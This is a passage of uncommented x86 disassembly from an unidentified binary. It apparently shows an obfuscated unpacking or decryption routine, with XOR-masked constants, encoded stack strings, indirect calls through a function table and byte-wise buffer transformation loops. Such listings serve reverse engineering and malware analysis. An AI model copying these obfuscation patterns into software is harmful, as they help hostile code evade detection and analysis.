  425d79:	mov    DWORD PTR [ebp-0xb4],0x2a0d180a
  425d83:	mov    BYTE PTR [ebp-0xb0],0x83
  425d8a:	lea    edi,[ebp-0xaf]
  425d90:	stos   DWORD PTR es:[edi],eax
  425d91:	stos   WORD PTR es:[edi],ax
  425d93:	stos   BYTE PTR es:[edi],al
  425d94:	mov    edi,DWORD PTR [ebp+0x8]
  425d97:	mov    eax,DWORD PTR [ebp+0x8]
  425d9a:	mov    edx,DWORD PTR [eax+0x1b8]
  425da0:	mov    DWORD PTR [ebp-0x68],0xd0f0e17
  425da7:	mov    DWORD PTR [ebp-0x64],0x1413101e
  425dae:	mov    WORD PTR [ebp-0x60],0x833c
  425db4:	mov    DWORD PTR [ebp-0x90],0x1b3e0e34
  425dbe:	mov    DWORD PTR [ebp-0x8c],0x173c0d1c
  425dc8:	mov    DWORD PTR [ebp-0x88],0x311c1b13
  425dd2:	mov    DWORD PTR [ebp-0x84],0xd181008
  425ddc:	mov    DWORD PTR [ebp-0x80],0x833c1e14
  425de3:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e34
  425dea:	mov    DWORD PTR [ebp-0x78],0x173c0d1c
  425df1:	mov    DWORD PTR [ebp-0x74],0x311c1b13
  425df8:	mov    DWORD PTR [ebp-0x70],0xd181008
  425dff:	mov    DWORD PTR [ebp-0x6c],0x832a1e14
  425e06:	call   0x4280fb
  425e0b:	push   eax
  425e0c:	mov    eax,DWORD PTR [ebp+0x8]
  425e0f:	mov    eax,DWORD PTR [eax+0x1a8]
  425e15:	push   DWORD PTR [eax]
  425e17:	call   0x427d9c
  425e1c:	test   eax,eax
  425e1e:	jne    0x425e70
  425e20:	mov    eax,DWORD PTR [ebp+0x8]
  425e23:	mov    eax,DWORD PTR [eax+0x1e0]
  425e29:	mov    edi,DWORD PTR [ebp+0x8]
  425e2c:	add    eax,0x4
  425e2f:	mov    DWORD PTR [ebp-0x20],eax
  425e32:	mov    eax,DWORD PTR [ebp+0x8]
  425e35:	mov    edx,DWORD PTR [eax+0x1b8]
  425e3b:	call   0x4280fb
  425e40:	push   eax
  425e41:	mov    eax,DWORD PTR [ebp-0x20]
  425e44:	call   DWORD PTR [eax]
  425e46:	test   eax,eax
  425e48:	jne    0x425e70
  425e4a:	mov    eax,DWORD PTR [ebp+0x8]
  425e4d:	mov    eax,DWORD PTR [eax+0x1e0]
  425e53:	mov    edi,DWORD PTR [ebp+0x8]
  425e56:	add    eax,0x10
  425e59:	mov    DWORD PTR [ebp-0x20],eax
  425e5c:	mov    eax,DWORD PTR [ebp+0x8]
  425e5f:	mov    edx,DWORD PTR [eax+0x1b8]
  425e65:	call   0x4280fb
  425e6a:	push   eax
  425e6b:	mov    eax,DWORD PTR [ebp-0x20]
  425e6e:	call   DWORD PTR [eax]
  425e70:	mov    eax,DWORD PTR [ebp-0x10]
  425e73:	mov    ecx,DWORD PTR [ebp-0x28]
  425e76:	xor    eax,ebx
  425e78:	add    eax,esi
  425e7a:	cmp    eax,ecx
  425e7c:	je     0x42603f
  425e82:	mov    eax,DWORD PTR [ebp-0x18]
  425e85:	xor    eax,ebx
  425e87:	mov    ecx,0xffcd8d0f
  425e8c:	sub    ecx,eax
  425e8e:	add    ecx,DWORD PTR [ebp-0x28]
  425e91:	mov    eax,DWORD PTR [ebp-0x1c]
  425e94:	cmp    eax,ecx
  425e96:	ja     0x42603f
  425e9c:	mov    DWORD PTR [ebp-0x34],0x0
  425ea3:	push   DWORD PTR [ebp+0x8]
  425ea6:	mov    edi,DWORD PTR [ebp+0x8]
  425ea9:	mov    eax,DWORD PTR [ebp+0x8]
  425eac:	mov    edx,DWORD PTR [eax+0x1b4]
  425eb2:	call   0x4280fb
  425eb7:	push   eax
  425eb8:	mov    eax,DWORD PTR [ebp+0x8]
  425ebb:	mov    eax,DWORD PTR [eax+0x1a8]
  425ec1:	push   DWORD PTR [eax]
  425ec3:	call   0x427d9c
  425ec8:	mov    ecx,DWORD PTR [ebp+0x8]
  425ecb:	mov    ecx,DWORD PTR [ecx+0x19c]
  425ed1:	mov    DWORD PTR [ecx],eax
  425ed3:	mov    eax,DWORD PTR [ebp+0x8]
  425ed6:	mov    edi,DWORD PTR [eax+0x1e0]
  425edc:	mov    esi,DWORD PTR [ebp+0x8]
  425edf:	xor    eax,eax
  425ee1:	lea    edx,[ebp-0x7c]
  425ee4:	call   0x428131
  425ee9:	push   eax
  425eea:	mov    eax,DWORD PTR [ebp+0x8]
  425eed:	mov    eax,DWORD PTR [eax+0x19c]
  425ef3:	push   DWORD PTR [eax]
  425ef5:	call   DWORD PTR [edi+0x8]
  425ef8:	mov    DWORD PTR [ebp-0x20],eax
  425efb:	mov    eax,DWORD PTR [ebp+0x8]
  425efe:	mov    edi,DWORD PTR [eax+0x1e0]
  425f04:	mov    esi,DWORD PTR [ebp+0x8]
  425f07:	xor    eax,eax
  425f09:	lea    edx,[ebp-0x90]
  425f0f:	call   0x428131
  425f14:	push   eax
  425f15:	mov    eax,DWORD PTR [ebp+0x8]
  425f18:	mov    eax,DWORD PTR [eax+0x19c]
  425f1e:	push   DWORD PTR [eax]
  425f20:	call   DWORD PTR [edi+0x8]
  425f23:	mov    eax,DWORD PTR [ebp+0x8]
  425f26:	mov    edi,DWORD PTR [eax+0x1e0]
  425f2c:	mov    esi,DWORD PTR [ebp+0x8]
  425f2f:	xor    eax,eax
  425f31:	lea    edx,[ebp-0xa8]
  425f37:	call   0x428131
  425f3c:	push   eax
  425f3d:	mov    eax,DWORD PTR [ebp+0x8]
  425f40:	mov    eax,DWORD PTR [eax+0x19c]
  425f46:	push   DWORD PTR [eax]
  425f48:	call   DWORD PTR [edi+0x8]
  425f4b:	and    DWORD PTR [ebp-0x8],0x0
  425f4f:	mov    DWORD PTR [ebp-0x48],eax
  425f52:	mov    eax,DWORD PTR [ebp-0x8]
  425f55:	and    eax,0x7
  425f58:	add    eax,0x31
  425f5b:	push   eax
  425f5c:	call   DWORD PTR [ebp-0x20]
  425f5f:	test   eax,eax
  425f61:	je     0x425fa5
  425f63:	mov    eax,DWORD PTR [ebp-0x8]
  425f66:	push   0x19
  425f68:	xor    edx,edx
  425f6a:	pop    ecx
  425f6b:	div    ecx
  425f6d:	add    dl,0x41
  425f70:	movzx  eax,dl
  425f73:	push   eax
  425f74:	call   DWORD PTR [ebp-0x48]
  425f77:	test   eax,eax
  425f79:	jne    0x425fa5
  425f7b:	mov    eax,DWORD PTR [ebp+0x8]
  425f7e:	mov    edi,DWORD PTR [eax+0x1e0]
  425f84:	mov    esi,DWORD PTR [ebp+0x8]
  425f87:	xor    eax,eax
  425f89:	lea    edx,[ebp-0x68]
  425f8c:	call   0x428131
  425f91:	push   eax
  425f92:	mov    eax,DWORD PTR [ebp+0x8]
  425f95:	mov    eax,DWORD PTR [eax+0x198]
  425f9b:	push   DWORD PTR [eax]
  425f9d:	call   DWORD PTR [edi+0x8]
  425fa0:	mov    DWORD PTR [ebp-0x14],eax
  425fa3:	jmp    0x425fa9
  425fa5:	and    DWORD PTR [ebp-0x14],0x0
  425fa9:	inc    DWORD PTR [ebp-0x8]
  425fac:	cmp    DWORD PTR [ebp-0x8],0x10
  425fb0:	jb     0x425f52
  425fb2:	mov    eax,DWORD PTR [ebp-0x18]
  425fb5:	mov    esi,DWORD PTR [ebp+0x8]
  425fb8:	xor    eax,ebx
  425fba:	mov    edi,0x3272f1
  425fbf:	add    eax,edi
  425fc1:	lea    edx,[ebp-0x10c]
  425fc7:	call   0x428131
  425fcc:	push   eax
  425fcd:	mov    eax,DWORD PTR [ebp-0x10]
  425fd0:	mov    esi,DWORD PTR [ebp+0x8]
  425fd3:	xor    eax,ebx
  425fd5:	add    eax,edi
  425fd7:	lea    edx,[ebp-0x12c]
  425fdd:	call   0x428131
  425fe2:	push   eax
  425fe3:	call   DWORD PTR [ebp-0x14]
  425fe6:	mov    ecx,DWORD PTR [ebp-0x10]
  425fe9:	xor    ecx,ebx
  425feb:	add    ecx,edi
  425fed:	cmp    ecx,eax
  425fef:	jne    0x425ff8
  425ff1:	mov    DWORD PTR [ebp-0x34],0x1
  425ff8:	mov    eax,DWORD PTR [ebp-0x18]
  425ffb:	mov    ecx,DWORD PTR [ebp-0x1c]
  425ffe:	xor    eax,ebx
  426000:	lea    eax,[eax+ecx*1+0x3272f1]
  426007:	mov    DWORD PTR [ebp-0x1c],eax
  42600a:	mov    eax,DWORD PTR [ebp-0x34]
  42600d:	test   eax,eax
  42600f:	je     0x426023
  426011:	mov    eax,DWORD PTR [ebp-0x18]
  426014:	mov    ecx,DWORD PTR [ebp-0x38]
  426017:	xor    eax,ebx
  426019:	lea    eax,[eax+ecx*1+0x3272f1]
  426020:	mov    DWORD PTR [ebp-0x38],eax
  426023:	mov    eax,DWORD PTR [ebp-0x18]
  426026:	xor    eax,ebx
  426028:	mov    ecx,0xffcd8d0f
  42602d:	sub    ecx,eax
  42602f:	add    ecx,DWORD PTR [ebp-0x28]
  426032:	mov    eax,DWORD PTR [ebp-0x1c]
  426035:	cmp    eax,ecx
  426037:	jbe    0x425e9c
  42603d:	mov    esi,edi
  42603f:	mov    eax,DWORD PTR [ebp-0x38]
  426042:	mov    ecx,DWORD PTR [ebp-0x1c]
  426045:	cmp    ecx,eax
  426047:	jne    0x42605a
  426049:	push   DWORD PTR [ebp+0x8]
  42604c:	lea    eax,[ebp-0x40]
  42604f:	push   eax
  426050:	call   0x428b9e
  426055:	mov    DWORD PTR [ebp-0x24],eax
  426058:	jmp    0x426066
  42605a:	mov    eax,DWORD PTR [ebp-0x24]
  42605d:	mov    ecx,DWORD PTR [ebp-0x18]
  426060:	xor    ecx,ebx
  426062:	add    ecx,esi
  426064:	xor    DWORD PTR [eax],ecx
  426066:	mov    eax,DWORD PTR [ebp-0x10]
  426069:	mov    ecx,DWORD PTR [ebp-0x24]
  42606c:	xor    eax,ebx
  42606e:	add    eax,esi
  426070:	cmp    eax,ecx
  426072:	je     0x4267e9
  426078:	mov    eax,DWORD PTR [ebp-0x10]
  42607b:	mov    ecx,DWORD PTR [ebp-0x40]
  42607e:	xor    eax,ebx
  426080:	add    eax,esi
  426082:	cmp    eax,ecx
  426084:	je     0x4267e9
  42608a:	mov    eax,DWORD PTR [ebp-0x10]
  42608d:	xor    eax,ebx
  42608f:	add    eax,esi
  426091:	jmp    0x4260af
  426093:	mov    edi,DWORD PTR [ebp-0x24]
  426096:	mov    cl,al
  426098:	and    cl,0x1f
  42609b:	or     dl,0xff
  42609e:	sub    dl,cl
  4260a0:	add    BYTE PTR [edi+eax*1],dl
  4260a3:	mov    ecx,DWORD PTR [ebp-0x18]
  4260a6:	xor    ecx,ebx
  4260a8:	lea    eax,[eax+ecx*1+0x3272f1]
  4260af:	mov    ecx,DWORD PTR [ebp-0x40]
  4260b2:	cmp    eax,ecx
  4260b4:	jb     0x426093
  4260b6:	mov    eax,DWORD PTR [ebp-0x40]
  4260b9:	mov    DWORD PTR [ebp-0x28],eax
  4260bc:	mov    eax,DWORD PTR [ebp-0x24]
  4260bf:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  4260c6:	mov    DWORD PTR [ebp-0xd4],eax
  4260cc:	mov    edi,0xf89c85ba
  4260d1:	mov    DWORD PTR [ebp-0x2c],edi
  4260d4:	mov    eax,DWORD PTR [ebp-0x38]
  4260d7:	xor    eax,ebx
  4260d9:	add    eax,esi
  4260db:	mov    DWORD PTR [ebp-0xc],eax
  4260de:	mov    eax,DWORD PTR [ebp-0x38]
  4260e1:	xor    eax,ebx
  4260e3:	add    eax,esi
  4260e5:	mov    DWORD PTR [ebp-0x8],eax
  4260e8:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  4260ef:	mov    DWORD PTR [ebp-0x4c],0xf89c85bc
  4260f6:	mov    eax,DWORD PTR [ebp-0x38]
  4260f9:	mov    ecx,DWORD PTR [ebp-0x28]
  4260fc:	xor    eax,ebx
  4260fe:	add    eax,esi
  426100:	cmp    ecx,eax
  426102:	je     0x426301
  426108:	jmp    0x4262dd
  42610d:	mov    ecx,DWORD PTR [ebp-0xc]
  426110:	mov    eax,DWORD PTR [ebp-0x28]
  426113:	sub    eax,ecx
  426115:	mov    ecx,DWORD PTR [ebp-0x48]
  426118:	xor    ecx,ebx
  42611a:	add    ecx,esi
  42611c:	xor    edx,edx
  42611e:	div    ecx
  426120:	mov    DWORD PTR [ebp-0x8],eax
  426123:	mov    eax,DWORD PTR [ebp-0x4c]
  426126:	mov    ecx,DWORD PTR [ebp-0x8]
  426129:	xor    eax,ebx
  42612b:	add    eax,esi
  42612d:	cmp    ecx,eax
  42612f:	jbe    0x42613b
  426131:	mov    eax,DWORD PTR [ebp-0x4c]
  426134:	xor    eax,ebx
  426136:	add    eax,esi
  426138:	mov    DWORD PTR [ebp-0x8],eax
  42613b:	mov    eax,DWORD PTR [ebp-0x48]
  42613e:	mov    ecx,DWORD PTR [ebp-0x8]
  426141:	xor    eax,ebx
  426143:	add    eax,esi
  426145:	imul   eax,ecx
  426148:	mov    DWORD PTR [ebp-0x8],eax
  42614b:	mov    eax,DWORD PTR [ebp-0x38]
  42614e:	mov    ecx,DWORD PTR [ebp-0x8]
  426151:	xor    eax,ebx
  426153:	add    eax,esi
  426155:	cmp    ecx,eax
  426157:	je     0x4262cb
  42615d:	mov    eax,DWORD PTR [ebp-0x8]
  426160:	mov    DWORD PTR [ebp-0x14],eax
  426163:	mov    eax,DWORD PTR [ebp-0xc]
  426166:	add    eax,DWORD PTR [ebp-0xd4]
  42616c:	mov    DWORD PTR [ebp-0x20],0xf89c85a5
  426173:	mov    DWORD PTR [ebp-0x34],edi
  426176:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  426180:	mov    DWORD PTR [ebp-0x8],eax
  426183:	mov    DWORD PTR [ebp-0x30],0xf89c85b8
  42618a:	mov    DWORD PTR [ebp-0x1c],edi
  42618d:	mov    eax,DWORD PTR [ebp-0x20]
  426190:	xor    eax,ebx
  426192:	add    eax,esi
  426194:	jmp    0x42628a
  426199:	mov    DWORD PTR [ebp-0xe0],0xf89c85b0
  4261a3:	mov    DWORD PTR [ebp-0xc4],0xf89c858f
  4261ad:	mov    eax,DWORD PTR [ebp-0x1c]
  4261b0:	mov    ecx,DWORD PTR [ebp-0x44]
  4261b3:	xor    eax,ebx
  4261b5:	add    eax,esi
  4261b7:	imul   eax,ecx
  4261ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4261bd:	mov    al,BYTE PTR [eax+ecx*1]
  4261c0:	mov    BYTE PTR [ebp-0x2],al
  4261c3:	mov    eax,DWORD PTR [ebp-0x1c]
  4261c6:	mov    ecx,DWORD PTR [ebp-0x44]
  4261c9:	xor    eax,ebx
  4261cb:	add    eax,esi
  4261cd:	imul   eax,ecx
  4261d0:	mov    ecx,DWORD PTR [ebp-0xe8]
  4261d6:	xor    ecx,ebx
  4261d8:	add    eax,ecx
  4261da:	mov    ecx,DWORD PTR [ebp-0x8]
  4261dd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  4261e5:	mov    ecx,DWORD PTR [ebp-0xe0]
  4261eb:	xor    ecx,ebx
  4261ed:	lea    eax,[ecx+eax*1+0x3272f1]
  4261f4:	movzx  ecx,BYTE PTR [ebp-0x2]
  4261f8:	xor    ecx,eax
  4261fa:	mov    BYTE PTR [ebp-0x2],cl
  4261fd:	mov    al,BYTE PTR [ebp-0x2]
  426200:	mov    ecx,DWORD PTR [ebp-0x1c]
  426203:	mov    edx,DWORD PTR [ebp-0x44]
  426206:	xor    ecx,ebx
  426208:	add    ecx,esi
  42620a:	imul   ecx,edx
  42620d:	mov    edx,DWORD PTR [ebp-0x8]
  426210:	mov    BYTE PTR [ecx+edx*1],al
  426213:	mov    eax,DWORD PTR [ebp-0x1c]
  426216:	mov    ecx,DWORD PTR [ebp-0x44]
  426219:	xor    eax,ebx
  42621b:	add    eax,esi
  42621d:	imul   eax,ecx
  426220:	mov    ecx,DWORD PTR [ebp-0x8]
  426223:	mov    al,BYTE PTR [eax+ecx*1]
  426226:	mov    BYTE PTR [ebp-0x2],al
  426229:	mov    eax,DWORD PTR [ebp-0x1c]
  42622c:	mov    ecx,DWORD PTR [ebp-0x44]
  42622f:	xor    eax,ebx
  426231:	add    eax,esi
  426233:	imul   eax,ecx
  426236:	mov    ecx,DWORD PTR [ebp-0x34]
  426239:	xor    ecx,ebx
  42623b:	add    eax,ecx
  42623d:	mov    ecx,DWORD PTR [ebp-0x8]
  426240:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272f1]
  426248:	mov    ecx,DWORD PTR [ebp-0xc4]
  42624e:	xor    ecx,ebx
  426250:	lea    eax,[ecx+eax*1+0x3272f1]
  426257:	movzx  ecx,BYTE PTR [ebp-0x2]
  42625b:	xor    ecx,eax
  42625d:	mov    BYTE PTR [ebp-0x2],cl
  426260:	mov    al,BYTE PTR [ebp-0x2]
  426263:	mov    ecx,DWORD PTR [ebp-0x1c]
  426266:	mov    edx,DWORD PTR [ebp-0x44]
  426269:	xor    ecx,ebx
  42626b:	add    ecx,esi
  42626d:	imul   ecx,edx
  426270:	mov    edx,DWORD PTR [ebp-0x8]
  426273:	mov    BYTE PTR [ecx+edx*1],al
  426276:	mov    eax,DWORD PTR [ebp-0x30]
  426279:	mov    ecx,DWORD PTR [ebp-0x34]
  42627c:	xor    eax,ebx
  42627e:	xor    ecx,ebx
  426280:	add    eax,esi
  426282:	add    ecx,esi
  426284:	imul   eax,ecx
  426287:	add    eax,DWORD PTR [ebp-0x44]
  42628a:	mov    DWORD PTR [ebp-0x44],eax
  42628d:	mov    eax,DWORD PTR [ebp-0x44]
  426290:	mov    ecx,DWORD PTR [ebp-0x14]
  426293:	cmp    ecx,eax
  426295:	jb     0x426199
  42629b:	mov    eax,DWORD PTR [ebp-0x34]
  42629e:	mov    ecx,DWORD PTR [ebp-0x14]
  4262a1:	xor    eax,ebx
  4262a3:	add    eax,esi
  4262a5:	imul   eax,ecx
  4262a8:	mov    ecx,DWORD PTR [ebp-0x20]
  4262ab:	xor    ecx,ebx
  4262ad:	add    ecx,esi
  4262af:	or     eax,ecx
  4262b1:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262b4:	xor    ecx,ebx
  4262b6:	add    eax,ecx
  4262b8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4262bb:	xor    ecx,ebx
  4262bd:	add    eax,ecx
  4262bf:	mov    ecx,DWORD PTR [ebp-0xc]
  4262c2:	lea    eax,[eax+ecx*1+0x64e5e2]
  4262c9:	jmp    0x4262da
  4262cb:	mov    eax,DWORD PTR [ebp-0x2c]
  4262ce:	mov    ecx,DWORD PTR [ebp-0xc]
  4262d1:	xor    eax,ebx
  4262d3:	lea    eax,[eax+ecx*1+0x3272f1]
  4262da:	mov    DWORD PTR [ebp-0xc],eax
  4262dd:	mov    eax,DWORD PTR [ebp-0x2c]
  4262e0:	xor    eax,ebx
  4262e2:	mov    ecx,0xffcd8d0f
  4262e7:	sub    ecx,eax
  4262e9:	add    ecx,DWORD PTR [ebp-0x28]
  4262ec:	mov    eax,DWORD PTR [ebp-0x2c]
  4262ef:	mov    edx,DWORD PTR [ebp-0xc]
  4262f2:	xor    eax,ebx
  4262f4:	add    eax,esi
  4262f6:	imul   eax,edx
  4262f9:	cmp    eax,ecx
  4262fb:	jbe    0x42610d
  426301:	mov    eax,DWORD PTR [ebp-0x10]
  426304:	mov    ecx,DWORD PTR [ebp-0x40]
  426307:	mov    eax,DWORD PTR [ebp+0x8]
  42630a:	mov    edx,DWORD PTR [ebp-0x54]
  42630d:	mov    eax,DWORD PTR [eax+0x1e0]
  426313:	xor    edx,ebx
  426315:	add    edx,esi
  426317:	push   edx
  426318:	mov    edx,DWORD PTR [ebp-0x3c]
  42631b:	xor    edx,ebx
  42631d:	add    edx,esi
  42631f:	push   edx
  426320:	push   ecx
  426321:	mov    DWORD PTR [ebp-0x30],ecx
  426324:	mov    ecx,DWORD PTR [ebp-0x10]
  426327:	xor    ecx,ebx
  426329:	add    ecx,esi
  42632b:	push   ecx
  42632c:	call   DWORD PTR [eax+0x14]
  42632f:	mov    edi,eax
  426331:	mov    eax,DWORD PTR [ebp-0x10]
  426334:	xor    eax,ebx
  426336:	add    eax,esi
  426338:	cmp    eax,edi
  42633a:	je     0x426395
  42633c:	mov    eax,DWORD PTR [ebp-0x10]
  42633f:	jmp    0x426362
  426341:	mov    ecx,DWORD PTR [ebp-0x24]
  426344:	xor    eax,ebx
  426346:	mov    cl,BYTE PTR [ecx+eax*1+0x3272f1]
  42634d:	mov    BYTE PTR [eax+edi*1+0x3272f1],cl
  426354:	mov    ecx,DWORD PTR [ebp-0x18]
  426357:	xor    ecx,ebx
  426359:	lea    eax,[ecx+eax*1+0x3272f1]
  426360:	xor    eax,ebx
  426362:	mov    ecx,DWORD PTR [ebp-0x40]
  426365:	sub    ecx,esi
  426367:	xor    ecx,ebx
  426369:	cmp    eax,ecx
  42636b:	jne    0x426341
  42636d:	mov    eax,DWORD PTR [ebp+0x8]
  426370:	mov    ecx,DWORD PTR [ebp-0x50]
  426373:	mov    eax,DWORD PTR [eax+0x1e0]
  426379:	xor    ecx,ebx
  42637b:	add    ecx,esi
  42637d:	push   ecx
  42637e:	mov    ecx,DWORD PTR [ebp-0x10]
  426381:	xor    ecx,ebx
  426383:	add    ecx,esi
  426385:	push   ecx
  426386:	push   DWORD PTR [ebp-0x24]
  426389:	call   DWORD PTR [eax+0x18]
  42638c:	mov    eax,DWORD PTR [ebp-0x30]
  42638f:	mov    DWORD PTR [ebp-0x24],edi
  426392:	mov    DWORD PTR [ebp-0x40],eax
  426395:	mov    edi,DWORD PTR [ebp-0x24]
  426398:	mov    eax,DWORD PTR [ebp-0x18]
  42639b:	mov    ecx,DWORD PTR [ebp-0x10]
  42639e:	xor    eax,ebx
  4263a0:	mov    DWORD PTR [ebp-0x30],edi
  4263a3:	add    eax,esi
  4263a5:	mov    DWORD PTR [ebp-0x5c],0x3c2b332b
  4263ac:	mov    DWORD PTR [ebp-0x58],0x362b3e2b
  4263b3:	jmp    0x4263e6
  4263b5:	xor    ecx,ebx
  4263b7:	mov    dl,BYTE PTR [ebp+ecx*1+0x327295]
  4263be:	xor    dl,0x7c
  4263c1:	inc    dl
  4263c3:	mov    DWORD PTR [ebp-0x3c],ecx
  4263c6:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272f1]
  4263ce:	movzx  edx,dl
  4263d1:	cmp    ecx,edx
  4263d3:	jne    0x4263f0
  4263d5:	mov    ecx,DWORD PTR [ebp-0x18]
  4263d8:	mov    edx,DWORD PTR [ebp-0x3c]
  4263db:	xor    ecx,ebx
  4263dd:	lea    ecx,[ecx+edx*1+0x3272f1]
  4263e4:	xor    ecx,ebx
  4263e6:	cmp    ecx,0xf89c85bd
  4263ec:	jne    0x4263b5
  4263ee:	jmp    0x4263f7
  4263f0:	mov    eax,DWORD PTR [ebp-0x10]
  4263f3:	xor    eax,ebx
  4263f5:	add    eax,esi
  4263f7:	mov    ecx,DWORD PTR [ebp-0x10]
  4263fa:	xor    ecx,ebx
  4263fc:	add    ecx,esi
  4263fe:	cmp    ecx,eax
  426400:	je     0x426573
  426406:	mov    eax,DWORD PTR [edi+0x8]
  426409:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426410:	mov    DWORD PTR [ebp-0x3c],0xf89cc3d4
  426417:	mov    DWORD PTR [ebp-0x48],0xf89cb5a5
  42641e:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  426425:	mov    DWORD PTR [ebp-0x14],eax
  426428:	mov    eax,DWORD PTR [ebp+0x8]
  42642b:	mov    ecx,DWORD PTR [ebp-0x20]
  42642e:	xor    ecx,ebx
  426430:	add    ecx,esi
  426432:	push   ecx
  426433:	mov    ecx,DWORD PTR [ebp-0x48]
  426436:	mov    eax,DWORD PTR [eax+0x1e0]
  42643c:	xor    ecx,ebx
  42643e:	add    ecx,esi
  426440:	push   ecx
  426441:	mov    ecx,DWORD PTR [ebp-0x3c]
  426444:	xor    ecx,ebx
  426446:	add    ecx,esi
  426448:	push   ecx
  426449:	mov    ecx,DWORD PTR [ebp-0xc]
  42644c:	xor    ecx,ebx
  42644e:	add    ecx,esi
  426450:	push   ecx
  426451:	call   DWORD PTR [eax+0x14]
  426454:	mov    edi,eax
  426456:	mov    eax,DWORD PTR [ebp+0x8]
  426459:	mov    ecx,DWORD PTR [ebp-0x20]
  42645c:	mov    eax,DWORD PTR [eax+0x1e0]
  426462:	xor    ecx,ebx
  426464:	add    ecx,esi
  426466:	push   ecx
  426467:	mov    ecx,DWORD PTR [ebp-0x48]
  42646a:	xor    ecx,ebx
  42646c:	add    ecx,esi
  42646e:	push   ecx
  42646f:	mov    ecx,DWORD PTR [ebp-0xc]
  426472:	push   DWORD PTR [ebp-0x14]
  426475:	xor    ecx,ebx
  426477:	add    ecx,esi
  426479:	push   ecx
  42647a:	call   DWORD PTR [eax+0x14]
  42647d:	mov    ecx,DWORD PTR [ebp-0xc]
  426480:	xor    ecx,ebx
  426482:	add    ecx,esi
  426484:	mov    DWORD PTR [ebp-0x20],eax
  426487:	cmp    ecx,edi
  426489:	je     0x426816
  42648f:	mov    ecx,DWORD PTR [ebp-0xc]
  426492:	xor    ecx,ebx
  426494:	add    ecx,esi
  426496:	cmp    ecx,eax
  426498:	je     0x426816
  42649e:	mov    DWORD PTR [ebp-0x3c],0xf89c85b8
  4264a5:	mov    DWORD PTR [ebp-0x54],0xf89c85bb
  4264ac:	mov    ecx,DWORD PTR [ebp-0x3c]
  4264af:	xor    cl,0xaa
  4264b2:	sub    cl,0xf
  4264b5:	mov    BYTE PTR [edi],cl
  4264b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4264ba:	xor    cl,0xaa
  4264bd:	sub    cl,0xf
  4264c0:	mov    BYTE PTR [edi+0x1],cl
  4264c3:	mov    ecx,DWORD PTR [ebp-0x54]
  4264c6:	xor    cl,0xaa
  4264c9:	sub    cl,0xf
  4264cc:	mov    BYTE PTR [edi+0x2],cl
  4264cf:	and    DWORD PTR [ebp-0xc8],0x0
  4264d6:	and    DWORD PTR [ebp-0xdc],0x0
  4264dd:	lea    ecx,[ebp-0xdc]
  4264e3:	push   ecx
  4264e4:	push   DWORD PTR [ebp-0x14]
  4264e7:	push   eax
  4264e8:	lea    eax,[ebp-0xc8]
  4264ee:	push   eax
  4264ef:	mov    eax,DWORD PTR [ebp-0x30]
  4264f2:	push   DWORD PTR [eax+0xc]
  4264f5:	mov    eax,DWORD PTR [ebp-0x24]
  4264f8:	add    eax,0x10
  4264fb:	push   eax
  4264fc:	push   edi
  4264fd:	call   0x4257a4
  426502:	mov    DWORD PTR [ebp-0x3c],eax
  426505:	mov    eax,DWORD PTR [ebp+0x8]
  426508:	mov    ecx,DWORD PTR [ebp-0x50]
  42650b:	mov    eax,DWORD PTR [eax+0x1e0]
  426511:	xor    ecx,ebx
  426513:	add    ecx,esi
  426515:	push   ecx
  426516:	mov    ecx,DWORD PTR [ebp-0xc]
  426519:	xor    ecx,ebx
  42651b:	add    ecx,esi
  42651d:	push   ecx
  42651e:	push   edi
  42651f:	call   DWORD PTR [eax+0x18]
  426522:	mov    eax,DWORD PTR [ebp-0x3c]
  426525:	add    eax,0xffcd8d0f
  42652a:	xor    eax,ebx
  42652c:	cmp    eax,0xf89c85a5
  426531:	mov    eax,DWORD PTR [ebp+0x8]
  426534:	mov    eax,DWORD PTR [eax+0x1e0]
  42653a:	mov    ecx,DWORD PTR [ebp-0x50]
  42653d:	jne    0x426560
  42653f:	xor    ecx,ebx
  426541:	add    ecx,esi
  426543:	push   ecx
  426544:	mov    ecx,DWORD PTR [ebp-0xc]
  426547:	xor    ecx,ebx
  426549:	add    ecx,esi
  42654b:	push   ecx
  42654c:	push   DWORD PTR [ebp-0x24]
  42654f:	call   DWORD PTR [eax+0x18]
  426552:	mov    eax,DWORD PTR [ebp-0x20]
  426555:	mov    DWORD PTR [ebp-0x24],eax
  426558:	mov    eax,DWORD PTR [ebp-0x14]
  42655b:	mov    DWORD PTR [ebp-0x40],eax
  42655e:	jmp    0x426573
  426560:	xor    ecx,ebx
  426562:	add    ecx,esi
  426564:	push   ecx
  426565:	mov    ecx,DWORD PTR [ebp-0xc]
  426568:	xor    ecx,ebx
  42656a:	add    ecx,esi
  42656c:	push   ecx
  42656d:	push   DWORD PTR [ebp-0x20]
  426570:	call   DWORD PTR [eax+0x18]
  426573:	mov    eax,DWORD PTR [ebp-0x40]
  426576:	mov    DWORD PTR [ebp-0x38],eax
  426579:	mov    eax,DWORD PTR [ebp-0x24]
  42657c:	mov    DWORD PTR [ebp-0x28],0xf89c85a5
  426583:	mov    DWORD PTR [ebp-0x3c],eax
  426586:	mov    edi,0xf89c85ba
  42658b:	mov    DWORD PTR [ebp-0x2c],edi
  42658e:	mov    eax,DWORD PTR [ebp-0x28]
  426591:	xor    eax,ebx
  426593:	add    eax,esi
  426595:	mov    DWORD PTR [ebp-0xc],eax
  426598:	mov    eax,DWORD PTR [ebp-0x28]
  42659b:	xor    eax,ebx
  42659d:	add    eax,esi
  42659f:	mov    DWORD PTR [ebp-0x14],eax
  4265a2:	mov    DWORD PTR [ebp-0x48],0xf89c8585
  4265a9:	mov    DWORD PTR [ebp-0x20],0xf89c85bc
  4265b0:	mov    eax,DWORD PTR [ebp-0x28]
  4265b3:	mov    ecx,DWORD PTR [ebp-0x38]
  4265b6:	xor    eax,ebx
  4265b8:	add    eax,esi
  4265ba:	cmp    ecx,eax
  4265bc:	je     0x4267b2
  4265c2:	jmp    0x42678e
  4265c7:	mov    ecx,DWORD PTR [ebp-0xc]
  4265ca:	mov    eax,DWORD PTR [ebp-0x38]
